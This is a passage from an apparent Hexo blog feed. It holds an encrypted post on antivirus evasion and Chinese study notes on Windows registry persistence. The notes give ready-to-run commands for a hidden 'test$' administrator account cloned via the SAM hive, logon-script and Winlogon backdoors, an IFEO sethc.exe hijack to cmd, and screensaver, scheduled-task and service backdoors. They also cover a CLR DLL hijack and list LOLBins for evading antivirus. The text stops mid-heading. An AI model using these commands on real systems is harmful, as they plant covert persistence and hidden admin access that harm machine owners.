fe89598e94ce1e423c14ee62dcfb3c5c33d865b9bacde5d302051727fc1555f0fd7a77ed9b22c2ed7663481b5328829fe1e028fff236437dcd75cb99468679db5e14169179f3e162e18b35999f6365486f5cb4f2f2e08edc0e2a13300c0fde9043a868f05a45740d4f8ff4a747e68e3031a68a18755b41beecd8af38a3b09e4bc1401ec354f04a22ff575c775ddce6e5911907a997809986ae890a1c530fb55e59d669ae4f450af5b162de49f5671811a276078c3dad2f6c353807a616e6ce58fc189af3084445cbbc81fcd25a74ef6be6aab4d99403b3594def6e063964c3c556aef19c9a4e7e2bc0116d0558113bb74869c35f064e72a83e3b76f77f83fd9d95eefc58aaccf32def7085e6a20525e24ca337248774671a8f3f56a7b88876afcd55d8da74ab384979a90c5cc992341f4e8bcc6cce7569b44ba41ee24eb251c70fd2f8fc662c38c3102ec903bebd6a710352300b1938e83373f90e86beabfdec5cab0c306909d6fec2091a2e8ee179d33837a8024cc504b858730ad22543cf2ab14635f08788d28bba00c2cfd5bbcc9df2ac4b558b3c3a179d7100d824518777147dbb023233598c35153cc4c57a592c7cf3683430588b518bb83fc550a1d7d1de879632865f46b7c4aa9cbe2f7d73fd18ca032f4194b39f55d8af98711fe706b4b57d7544b5101bc3f2dc1bc40ad839c851f4f8eca37c6644e91b11c12f8d4ff71c4ff460a9ef8a3b84c405165e65cb099826b5f96c84889517f635da36dab71a53d59aabe4bc4060824cba897d069f682791b1bf91871db93fae4bdc12c791e425eed8808d4c2aec14e4adf5a673d7537f3ad3d07eba469d12bf5e487d26c623aeb8e9f496f67b4a8b425dd1c4fd6c891863c2c9c51b74adec47384bd2141b147941d5895a42098999323d13ca7762331ba1a44b1e6d30bc2bfac40f901e545efeffc54222495dc7fad98b520a01c01b3a3aa6f8a6e80ceaaca78eaf4d586e50437da4e95ea5a8b5b7e456faa387c4254d5d1cd2d41ec6b13a837d8de9cbb1605cb36cd4b277540d1ffebed6f6f662e55a97e6d687535574f3418716d0e0b165ac20c59355415e21a50208f4c7418dcef2ab9312b8974f9929b746b0f37270fb8cfb1fdc8967bae22b76bfd748ff475daf1ff4fa1245be56c5af45a7c91c562b3725547308f4c5162325039e83b710d5928dc01d8b4b334973562c553fad20c47f2570e64ee0bdfcdd597d193ff2aa81109efc2d42295a0568722a4829f0eaeeec5491646d77c5a79c3f307b26cbcd565b6177275834f8a3e1f2459005257837b2ad523dd00d1b0e911c5c842b1b545939ed3c82685bcf7a7e982001d2b3f0f170025e84e36db96d59e9b6305c7d7dc3656c0d5ce003b4ee088086e408c9f43841f5f1cc9c911d2f2e0315fa9634d7035ac20ca77f529ee7bf814f13f558b862bdb5b1945ba5420e34b1187350f1e23e2c5f0cc96d1eae5f3e2d2502b9d7064728fa84e20e1bcb73ab5889f09d99a2b55578292e351deb543226d59645598c6c9fca83a6d0b71562f63abdf56a3c19731c5633ddab83fc64e1fa7e8dc83da8ba3623493a31b6ded7ff6d5fea6f81be02575a0c77877c52a36b16fbb6d9ea6bdc8266d0b0ff2dd1056b39f48c9b53d12654ca20b586b1d765973054974e3ee817efa96f3521b4f9994fe03537e8613856f165d9a2a24d3c34f3f01b54656ac63ee0a3518f0380df9a3675f8e6a77b58623477a430ccf31277a9429dee054250e733026d215a512f23edefb383e3e43affc892a77dca79aecff0146611c2abe1f788e4e26e73c050cb58d38affbc8094041ff8c114656f1c63c5cdda304efd7ef120f1be59047e10a97afd6cdf5cac660d62d7408307dd8e16a4a4c6e6156dc70b1f3d9fa4bc6552b2a10c906e68ff2e78c29ab5bdef3e85c7bafba774e9d18f909a66d6bdbf8cf7262864e0fb218a1b2e8d99098dc34726fb4aafa09285199a1a61a96bfe88d67fbd641d47549a974c927aa8e28fad88bb4b430951c6bb4d17da3df08037edd5d3dc69605cd3cd1101e41e30b283f41389029b491f44613b18ff666bb0792016637dbface68c08987b17709f3851d5fe025c1c4ebe7e14c614480e2547b095167a49d7750fc5be4bd249573566dbe12a3aca369b0625ade45c819e0c286fd2019fcbda5182a0928585dbb92b3d2c7c780a9f0aa1d0608ffff4812850bf15cc768bbe1b8dc84cc277ba234c178b25acc8d6c8131521185f3df507a0ce94a9ff3761e7a8214f3f73b3e95c8b7f251ef08ea609b74de785ccfbbb2aeb1817f1706a9fcf7a313960bc084fb4506313e9b88b931a1d7d0cd01ff4af2253c9b764654ef5b32518a1f8461f1e360676118f1e00aa4cfba40f0fb8d857d88421d62c1f29fd0725d3e07ccb2e93e002c29bdb25761127a036fafd213420f80e24de638107f833dc484157698214c8e67a50a8fc7f67071613ea9e3fde1fc629fcf90fe74d02a551f9ba99ff9c45908981845e1c60ce2a2744fedc0a891cacee613b40ee962d724517b0c993784f8dc51afc73ce7bc6a8494496f36b6c7005820fb51ff8e6754f0bb166e2858dc02a5d10e555c4299e1a711c641524fdb1179bc4e30a5812824110f8f912210ea240ca13457860259d49ae91712345f434a565ce7c512acddf59fa9c55bd5230d2c180b335ca186595a2474185cf2c926b87a7f0678b925a733946cb39c0859b4c3b4e51f97fa8f780e089b8d672757537169c244228d0884ceed250dd6c0eba842eaa035097aed0a1b6837a0a11f8a1ac63e55e3bc92a03239798b19fe38bda0f96e97192e6fde04264eff3d1ca5b790673da55cba74a79233261793bad173b5428b8f24d87d5db0ffd9443c1ea7aa2ea9e1fc10a6038ca3bd7bd6f87fb41b1136963ae0974dae4016cdb2ab712bd7eb6a906d39964a77b60704749f0612fd9aa21907068d951ed55cc29847d95c70dbf5f03b3ec7948ff73b93ec3fbadebf6a72d8c6da79a0a56796264c5b724b8e2966c50fe4d19abb3dcc2c05cfcdb80a33ca5e75041d1d8906021fa751be57d2c9c46d895881946d5cc6e2dbfe0ac49bcd03d4ca8ab21fa6eaf6bf37c1786f21116ffb2f914df4373e65ef92a8af3542a13026c6bede3dab9d1fe20f30b0271f76c9f6be3a0d7acaa34c5a5cb0d2f8b2b2b9c851d7a647ba6bf13fd17a6acddc07af074499208be5a4c21af468aa84f94fc4f33d040c013d7732a7f58753f7d6b4feda599d2c0ec739ba476eee1ad577880d76430957cdbf4758ee04563ef3dc33da3aaf8089080cb2e75b8cb50361ca8befd299f5be3de77e1e5f5a0138db1e0966131eff60be30767740a936362d30d7d3fb2c85f32cff27cad277d3e9e1c53eb19f686ad6f769a1d17868b832ff10749ef6324c6ebaf15f1fdc790a3cb278ddfca432e2ac04f666883c6ab2b682cc483e33866ebbb13a4bf9533c259643641095125ef1cf7fc8c43451eec4aa24ffe8e56180c7af9f5f898134d831929efa30cb3f4a945c27ab83cecc73397843f26146f0e9f43e10205c4c45d9b51809a5c6b2a02fa7799f8f7cfbc7caa61ba33be2d71d9a9d4b3ba3d29aced8f079e866c593a5845f07c8bcaa8bd4d34d15827c37f32602ba9d3a5cf2d73ff31f47532a6ae3147b82f284c4b8c0f5196c519fc6d6fc3370fd347714f46a36edd562cf8cc2264c68e9500dc8e1180d96a18b492daa4ca4282b98e535b2fa6c6fb6779b74ac0a0d3190276b934909f2af4582da46a756f65a502c98e07acfa6a3bf87b70cd88922122ee75556ad318130996d4fbbb0bb794066fd96fe0d5505dfd5c64d61ba87ef91b67ff78baeba687b00a6682e585298d994f57796881ec53c85aba474196c7dd3eb9aad3880ad4412ec76302c658b6c23dc7d2d00d520dc806b1d23366f571ee544281a2681659f8c79a68555e44eaa97333068ffa9d85b32d1b0e45cf8d72a7f11f1065598279799306a7e15700d84e1c1756d9ff30ff6c989ed3419d5e1bc39a5644e140eabe8caa87e313d08c35f91afa95cafbb8c00e601835a512d8342bfac078e90566ab1f36f80c01138d2281af59d68a5501fc7dba04a342198dc0024fe012a7a0c74f97a56243ee874984acf106397f194b9fe428684020dbfc9766dbfc4e9f79e7cf0c3b1b2a0b5e617ec3fe154708319b72e388a1f2e6ca34800c115de16f2df18d5bdfda7d7e6939442d20210ed119ca05d7c2ed33510beba1249d76c732225bfe64254497215b85952d0335b0347be69b153519737d572144998a3f32293c78e277ab9c5d837150752e0f961b6fad37986c4a1028096ca057b0af76404f40c56d1eef46ac8d36667d9e263dfe1fb1ea31618e998fd39a19bb946a4f67ba0a49e31ffd00a6c3d17ecdaac70aefb341a32edad2c05690ad34cf5f274638e33b79b831f4c5ea86b8451bc8a360ecef99705ebf677e2b8f66baa327d25279a4e84362a313e43a896460d8d11f6540a7c2357a7945096a9983ebb331ccb2fc6b03eb932d8edae20f3089529d35b1f61568124201ccd1ae3acb2f840e146ddf5c9a839623d4ab65a9b2af45410d54ab66b46d38ab352116d94a846482f091879ab1138255f1e77bc063cffe830810b40a4d29c9c0e150e77089587b6bb0416bac8457c8b4122aff1ed00df70a5ab411301c6f740fadd6d0bfd0cd55860ea5e69fee301364afee07299f231814fae17a807d1a3452c1724bbb28e2d31c3554dbfab6e893a178bacd894428bc1eb31f6d918bf42b3eda89f05fa0b3ef3f986c289c10c1fb9c81d76b53fc66393936eb2dfcdb61fc957e47f005b02f3e6210010ca688c1bca2665e59c796c9ea972412790092a4201ca01413d7a91d592849659c1357fbc02a0234a08792f1096c09afacafaaa6f4b710b9f317451a910dccbcca35b13577781b008c063e6bad85770987c241dd12ba2236c34bbd5a2f407f1f78c771177599894086f6afbf3d2a7fef6589dc850289f8c5b69ac2ea0fc92cc01a1393aadf0648f5f38998e5e023a22c5c39a7580d604ef246ad2f8cf2e1b82bdf0c326bf52da2f43886d216dfe7067ca3fded969dd5bcd6988dc82bae5aa53bcb2d2ee22658bfc9856ccb4505885dc4472f2e552815d16ce0625b6b8e81575415e960974dc78439ee426c5ef48fd32238d88f7ff1466dde795a4349d566e2c2ffad935396f680d1b5414848328e01c506742d7acd4015b01d31a121bf1ae16b394b81767e11d2979dcf82d7243514d7fbec7187562bad5f63bcd99bc82d8a2fce66d7d8f9efb9a949516ce662f13967b6d8ca0f5b651992fd6da7c67a5efcabbb530c5d9f3cc78f5b3af855b53ab8e0fad43dc13711f3160b6007f457203eea45283dfeab5f6eade1ad13d321e2158f8258de91eb45c2a56bc1be26b3c681bbc5a2cd2d43f12662cb112b2f8347665adc3d454bb8b4600dc29e5a92bf3cb7e3076fd5b94187469dbf16d8aa9f89f8cdaf2ae26e4c0e7e6b30834a70763b02d940aff6a53abf31aed51cf61996282e33c2b60551bb00f01c2931b113035de387d9a924afb1d63bc8a5f47c4c5d2fea338650348cff175290532186fce9c89a8537424d8c2c853f078a186543e41dfa2b355343822240b79256514c668ddc8adc6c87b6382be1ec916dac52d6b60cdec5e4135bcfbf49609e5bd31e2fa30c8b7f5631a28138db194ee9318bde9a1d33e1548ce32c51dc6af6546d4981aef720ac2129e3dc964455c624e196e04256ce96fd77dabb5f6b3262b11851cf858d126930089b7e6ff4a5e27298b4b6fd5ccf865376fd4569e0ecc9116a9020038850425f7bdc130522d2a40b26b1bb1858a96af301da3fa205a98ca03582224e9c214237a21c86fc96b3d68f38b0716942baec13ac12513dd8b2494e772e4de40cd1456219e1890cfdb5641fec19a511a5e969c63fbe27848004c2a47b4f00cab3e01cc8b644d9db24bcad770a40cc64d7c865f518ce9086ed7dcb7993c6bf602b5a6e572e7c0385819b588c0b37c8c5b13075e1302069bd8dde856cb966d92b4042817cce3c4ed82a5a74ea33a192defc60d6f3b16604c4c3d5c9813266e2f1caf6869cfa3ca6aa26ffb0fea9a2bd0c659b060658e25f1cd3677e7d579e75dc762e1b7e9caa9a0ddf352a0911aeeaa738114653a936fc179ce34</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>免杀</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>注册表免杀</title>
    <link href="/%E7%86%9F%E6%82%89%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B8%97%E9%80%8F%E5%85%8D%E6%9D%80%E6%8C%87%E4%BB%A4.html"/>
    <url>/%E7%86%9F%E6%82%89%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B8%97%E9%80%8F%E5%85%8D%E6%9D%80%E6%8C%87%E4%BB%A4.html</url>
    
    <content type="html"><![CDATA[<h1 id="熟悉注册表渗透权限维持（）"><a href="#熟悉注册表渗透权限维持（）" class="headerlink" title="熟悉注册表渗透权限维持（）"></a>熟悉注册表渗透权限维持（）</h1><p>注册表对于权限维持有很大用处。</p><p>搁置了很久。一直想写个总结方便以后使用</p><p>先看看注册表的自启动项</p><h2 id="一、注册表自启动项"><a href="#一、注册表自启动项" class="headerlink" title="一、注册表自启动项"></a>一、注册表自启动项</h2><p>自启动项地址C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup</p><p><code>MSF</code>的<code>Persistence</code>模块利用的就是写注册表自启动项来实现的，一般自启动项是这两个键：<code>Run</code>和<code>RunOnce</code>，两者的区别如下</p><ol><li>Run：该项下的键值即为开机启动项，每一次随着开机而启动。</li><li>RunOnce：RunOnce和Run差不多，唯一的区别就是RunOnce的键值只作用一次，执行完毕后就会自动删除</li></ol><p>常见注册表启动项键的位置：</p><p>用户级</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run<br>\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce<br><br></code></pre></td></tr></table></figure><p>系统级</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce<br>\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run<br>\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce<br><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225134255543.png" alt="image-20211225134255543"></p><p>在这里添加可执行文件既能自启动。后面加个 -hide 还能躲在任务栏里启动</p><p>添加格式  下面各个利用姿势里面有写。 模板套一下就行</p><h2 id="二、下面再介绍win自带113个可执行白名单远控免杀软件"><a href="#二、下面再介绍win自带113个可执行白名单远控免杀软件" class="headerlink" title="二、下面再介绍win自带113个可执行白名单远控免杀软件"></a>二、下面再介绍win自带113个可执行白名单远控免杀软件</h2><p>有多种配合方式</p><p>可以通过劫持白名单程序注入载荷或dll劫持+软件隐身术+自启动进行免杀维持</p><p>113个可执行白名单文件如下：</p><p>：Rundll32.exe、Msiexec.exe、MSBuild.exe、InstallUtil.exe、Mshta.exe、Regsvr32.exe、Cmstp.exe、CScript.exe、WScript.exe、Forfiles.exe、te.exe、Odbcconf.exe、InfDefaultInstall.exe、Diskshadow.exe、PsExec.exe、Msdeploy.exe、Winword.exe、Regasm.exe、Regsvcs.exe、Ftp.exe、pubprn.vbs、winrm.vbs、slmgr.vbs、Xwizard.exe、Compiler.exe、IEExec.exe、MavInject32、Presentationhost.exe、Wmic.exe、Pcalua.exe、Url.dll、zipfldr.dll、Syncappvpublishingserver.vbs等等</p><p>参考链接：<a href="https://blog.csdn.net/shuteer_xu/article/details/106346101">https://blog.csdn.net/shuteer_xu/article/details/106346101</a></p><h2 id="三、现在从多方面讲讲注册表的利用之处"><a href="#三、现在从多方面讲讲注册表的利用之处" class="headerlink" title="三、现在从多方面讲讲注册表的利用之处"></a>三、现在从多方面讲讲注册表的利用之处</h2><p><strong>1.利用注册表隐藏用户（影子账户）</strong></p><p>①使用如下命令创建隐藏用户并加入管理员组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net user <span class="hljs-built_in">test</span>$ 123456 /add<br>net localgroup administrators <span class="hljs-built_in">test</span>$ /add<br></code></pre></td></tr></table></figure><p>创建成功后使用net user命令无法查看到此用户，但是在计算机管理页面中还是可以看到，需要通过修改注册表来隐藏。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201826550.png" alt="image-20211225133242946"></p><p>②打开注册表（HKEY_LOCAL_MACHINE\SAM\SAM）</p><p>修改SAM权限，赋予adminitrators完全控制权限。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201827076.png" alt="image-20211225133011115"></p><p>③将Administrator用户对应项的F数据值复制到test$用户对应项的F数据值</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201827478.webp" alt="图片"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201827368.png" alt="image-20211225133334128"></p><p>⑤将test$和所对应项000003F1导出，分别命名为test.reg和1.reg</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201827615.png" alt="image-20211225133429589"></p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225133438148.png" alt="image-20211225133438148"></p><p>⑤删除test$用户，将test.reg和1.reg导入注册表</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> user <span class="hljs-keyword">test</span>$ /del<br><br>regedit /s <span class="hljs-keyword">test</span>.<span class="hljs-keyword">reg</span><br><br>regedit /s 1.<span class="hljs-keyword">reg</span><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225133505704.png" alt="image-20211225133505704"></p><p>⑥此时在用户组已经看不到test$用户，只能在注册表中能看到。</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225133527553.png" alt="image-20211225133527553"></p><p>2.<strong>logon scripts后门</strong></p><p>Windows登录脚本，当用户登录时触发，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截。</p><h6 id="演示："><a href="#演示：" class="headerlink" title="演示："></a><strong>演示：</strong></h6><p>注册表位置：HKEY_CURRENT_USER\Environment</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">ADD</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_CURRENT_USER\Environment&quot;</span> /v UserInitMprLogonScript /t REG_SZ /d <span class="hljs-string">&quot;C:\666.exe&quot;</span>   <span class="hljs-comment">#创建键为：UserInitMprLogonScript，其键值为我们要启动的程序路径</span></span><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225133825608.png" alt="image-20211225133825608"></p><p>重启，即可上线。</p><p><strong>3.映像劫持</strong></p><p>“映像劫持”，也被称为“IFEO”（Image File Execution Options），在WindowsNT架构的系统里，IFEO的本意是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。当一个可执行程序位于IFEO的控制中时，它的内存分配则根据该程序的参数来设定，而WindowsN T架构的系统能通过这个注册表项使用与可执行程序文件名匹配的项目作为程序载入时的控制依据，最终得以设定一个程序的堆管理机制和一些辅助机制等。出于简化原因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它就运行出问题。</p><h6 id="演示：-1"><a href="#演示：-1" class="headerlink" title="演示："></a><strong>演示：</strong></h6><p>注册表位置：HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\</p><p>在此注册表位置添加项sethc.exe（配合sethc指代键），添加debugger键的值为c:\windows\system32\cmd.exe</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v <span class="hljs-string">&quot;Debugger&quot;</span> /t REG_SZ /d <span class="hljs-string">&quot;c:\windows\system32\cmd.exe&quot;</span> /f</span><br><br><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/640.webp" alt="图片"></p><p>此时点击五次shift键会打开cmd。</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-16404251409552.webp" alt="图片"></p><h4 id="④注册表自启动后门（开头有讲，这里作为补充）"><a href="#④注册表自启动后门（开头有讲，这里作为补充）" class="headerlink" title="④注册表自启动后门（开头有讲，这里作为补充）"></a>④注册表自启动后门（开头有讲，这里作为补充）</h4><p>还有这个位置：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</p><p>修改键Userinit的值，重启就会自动运行程序。</p><p><img src="/../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/640.webp" alt="图片"></p><p><img src="/../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/640.webp" alt="图片"></p><h4 id="⑤屏幕保护程序后门"><a href="#⑤屏幕保护程序后门" class="headerlink" title="⑤屏幕保护程序后门"></a>⑤<strong>屏幕保护程序后门</strong></h4><p>屏幕保护是Windows功能的一部分，使用户可以在一段时间不活动后放置屏幕消息或图形动画。Windows的此功能被威胁参与者滥用为持久性方法。这是因为屏幕保护程序是具有.scr文件扩展名的可执行文件，并通过scrnsave.scr实用程序执行。</p><h6 id="演示：-2"><a href="#演示：-2" class="headerlink" title="演示："></a><strong>演示：</strong></h6><p>注册表位置：HKEY_CURRENT_USER\Control Panel\Desktop</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SCRNSAVE</span>.EXE为默认的屏保程序，我们可将此键值设置为我们要利用的恶意程序。在本质上，.scr文件是可执行文件。ScreenSaveActive表示屏保状态，<span class="hljs-number">1</span>为启动，<span class="hljs-number">0</span>为关闭。ScreenSaverTimeout表示屏幕保护程序启动前系统的空闲事件，单位为秒，默认为<span class="hljs-number">900</span>(<span class="hljs-number">15</span>分钟)。ScreenSaverIsSecure默认参数为<span class="hljs-number">0</span>，标识不需要密码即可解锁。<br></code></pre></td></tr></table></figure><p><img src="/../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/640.webp" alt="图片"></p><p>修改SCRASAVE.EXE的值为后门程序路径，等待屏保时间自动运行。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot;</span> /v SCRNSAVE.EXE /t REG_SZ /d <span class="hljs-string">&quot;c:\666.exe&quot;</span> /f</span><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-16404251510935.webp" alt="图片"></p><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-16404251489924.webp" alt="图片"></p><h4 id="⑥-计划任务后门"><a href="#⑥-计划任务后门" class="headerlink" title="⑥.计划任务后门"></a>⑥.<strong>计划任务后门</strong></h4><p>schtasks命令设定计划自动启动后门程序。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/Create</span> <span class="hljs-string">/tn</span> Updater <span class="hljs-string">/tr</span> c:\666.exe <span class="hljs-string">/sc</span> minute <span class="hljs-string">/mo</span> 5  <span class="hljs-comment">#每5分钟自动执行666.exe</span><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-16404251548426.webp" alt="图片"></p><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-16404251560987.webp" alt="图片"></p><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-16404251577068.webp" alt="图片"></p><h4 id="⑦-服务自启动后门"><a href="#⑦-服务自启动后门" class="headerlink" title="⑦.服务自启动后门"></a>⑦.<strong>服务自启动后门</strong></h4><p>自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将exe文件注册为服务，也可以将dll文件注册为服务。</p><h6 id="演示：-3"><a href="#演示：-3" class="headerlink" title="演示："></a><strong>演示：</strong></h6><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">sc</span> create <span class="hljs-keyword">test</span> binpath= c:\666.exe    （注意等号后面有空格）#创建服务<span class="hljs-keyword">sc</span> config <span class="hljs-keyword">test</span> start= auto    #设置服务为自动启动<span class="hljs-keyword">net</span> start <span class="hljs-keyword">test</span>                #启动服务<br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-16404251593459.webp" alt="图片"></p><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-164042516084310.webp" alt="图片"></p><p><strong>⑧CLR劫持</strong></p><p>CLR全称Common Language Runtime，中文名称为公共语言运行时。CLR是.NETFramework的主要执行引擎，作用之一是监视程序的运行。可以理解成，让系统在执行.NET程序的时候先执行一个你指定的dll文件。</p><p>1.修改注册表：HKEY_CURRENT_USER\Software\Classes\CLSID\</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">REG ADD <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1234-1234-1234-111111111111&#125;\InProcServer32&quot;</span> <span class="hljs-string">/VE</span> <span class="hljs-string">/T</span> REG_SZ <span class="hljs-string">/D</span> <span class="hljs-string">&quot;C:\test.dll&quot;</span> <span class="hljs-string">/FREG</span> ADD <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1234-1234-1234-111111111111&#125;\InProcServer32&quot;</span> <span class="hljs-string">/V</span> ThreadingModel <span class="hljs-string">/T</span> REG_SZ <span class="hljs-string">/D</span> Apartment <span class="hljs-string">/F</span><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-164042516271211.webp" alt="图片"></p><p>2.配置全局环境变量，不然只在当前cmd窗口劫持.net程序，然后直接执行powershell即可上线。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SETX</span> COR_ENABLE_PROFILING <span class="hljs-number">1</span> /MSETX COR_PROFILER &#123;<span class="hljs-number">11111111</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">111111111111</span>&#125; /M<br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-164042516440612.webp" alt="图片"></p><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-164042516596913.webp" alt="图片"></p><p><strong>三</strong>中方法是通过参考链接：<a href="https://mp.weixin.qq.com/s/cAjdbHfNc4Kh68zzwTfJgA">https://mp.weixin.qq.com/s/cAjdbHfNc4Kh68zzwTfJgA</a></p><p>这个链接的参考链接是：</p><p>1.<a href="https://www.jianshu.com/p/4936da524040">https://www.jianshu.com/p/4936da524040</a><br>2.<a href="https://hackergu.com/power-clr-thief/">https://hackergu.com/power-clr-thief/</a><br>3.<a href="https://cloud.tencent.com/developer/article/1850726">https://cloud.tencent.com/developer/article/1850726</a><br>4.<a href="https://xz.aliyun.com/t/6461">https://xz.aliyun.com/t/6461</a><br>5.<a href="https://cloud.tencent.com/developer/article/178286">https://cloud.tencent.com/developer/article/178286</a></p><h2 id="四：恶意软件隐身术"><a href="#四：恶意软件隐身术" class="headerlink" title="四：恶意软件隐身术"></a>四：恶意软件隐身术</h2><p>把可执行文件隐藏在注册表里</p><p>一个并不多见的恶意软件编写技术：把可执行代码隐藏在windows注册表里。这个技术需要我们把可执行文件的一部分或者入口写进注册表里，然后加载并执行它。这种技术意在隐藏二进制文件潜在的恶意功能，取而代之的是分散在windows注册表里的键值，最终使得恶意二进制文件难以被检测。实际上，键值里的可执行代码被加载的时候，会进行随机次数的编码（重编码），使得特征码扫描更加困难。好的检测策略是监控进程加载数据过程，而不是扫描注册表。</p><h1 id="恶意软件隐身术：把可执行文件隐藏在注册表里"><a href="#恶意软件隐身术：把可执行文件隐藏在注册表里" class="headerlink" title="恶意软件隐身术：把可执行文件隐藏在注册表里"></a>恶意软件隐身术：把可执行文件隐藏在注册表里</h1><p>本文主要描述了一个并不多见的恶意软件编写技术：把可执行代码隐藏在windows注册表里。这个技术需要我们把可执行文件的一部分或者入口写进注册表里，然后加载并执行它。这种技术意在隐藏二进制文件潜在的恶意功能，取而代之的是分散在windows注册表里的键值，最终使得恶意二进制文件难以被检测。实际上，键值里的可执行代码被加载的时候，会进行随机次数的编码（重编码），使得特征码扫描更加困难。好的检测策略是监控进程加载数据过程，而不是扫描注册表。</p><h3 id="0x00-存储文件到注册表"><a href="#0x00-存储文件到注册表" class="headerlink" title="0x00 